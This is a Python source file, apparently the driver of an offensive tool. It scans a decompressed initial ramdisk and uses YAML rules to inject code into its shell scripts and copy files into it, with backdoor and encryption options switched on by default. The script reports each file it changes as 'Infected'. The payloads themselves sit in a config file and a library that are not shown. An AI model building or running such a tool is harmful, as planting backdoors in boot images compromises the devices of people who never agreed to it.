 #!/usr/bin/env python
"""Patch shell script by rules

That script is thought for scan a directory, which suppose to be an initial ramdisk decompressed.
Is able to find the file to attack.
"""
from sys import exit, argv
from getopt import getopt, GetoptError
from os import path
from yaml import load
from libpatcher import *

def main(argv):
    want_backdoor  =   True
    want_encrypt   =   True
    src            =   None    #root of decompressed initial ramdisk
    config_file    =   "patcher.yaml"

    try:
        opts, args = getopt(argv,"bec:h",["exclude-backdoor","exclude-encrypt","config=","help"])
    except GetoptError:
        exit(usage())

    for opt, arg in opts:
        if opt in ("-h","--help"):
            exit(printHelp())
        elif opt in ("-b", "--exclude-backdoor"):
            want_backdoor = False
        elif opt in ("-e","--exclude-encrypt"):
            want_encrypt = False
        elif opt in ("-c","--config"):
            config_file = arg

    src = " ".join(args)
    if src is "":
        exit(usage())
    elif not path.exists(src):
        exit("Could not open: " + src.replace(" ","\ "))

    try:
        with open(config_file, 'r') as config:
            rules = load(config)
    except FileNotFoundError:
        exit("Configuration file " + config_file + " not found.")
    except OSError:
        exit("[!] Not able to open " + config_file)
    else:
        config.close()

    if not isinstance(rules, list):
        exit("Wrong configuration file: check it out " + config_file)

    for rule in rules:
        if "copy" in rule:
            try:
                _, injected = applayRule(rule)
            except SchemaError:
                print("[!] Error in configuration file rule: " + rule["rule_name"])
            else:
                for file_to_copy in rule["copy"]:
                    if path.basename(file_to_copy) in injected:
                        print("[+] File " + file_to_copy + " has been copied in " + rule["dest"])
                    else:
                        print("[!] File " + file_to_copy + " HAS NOT been copied in " + rule["dest"])
            continue # continue with the next rule!

        for txt_file in getTxtFiles(rule, src):
            try:
                with open(txt_file, 'r') as fp:
                    txt_buff = fp.readlines()
            except OSError:
                print("[!] Not able to open " + txt_file)
            else:
                fp.close()

            injected = []
            try:
                txt_buf_mw, injected = applayRule(rule, txt_buff)
            except SchemaError:
                print("[!] Error in configuration file rule: " + rule["rule_name"])
                continue

            if injected:
                try:
                    with open(txt_file, 'w+') as fp:
                        for mw_line in txt_buf_mw:
                            fp.write(mw_line)
                except OSError:
                    print("[!] Not able to write " + txt_file)
                    continue
                else:
                    fp.close()

                ################################################# OUTPUT #######
                for i in injected:
                    print("[+] Infected with \"" + rule["rule_name"] + "\" -> @" + str(i) + ": " + txt_file)

if __name__ == "__main__":
    main(argv[1:])
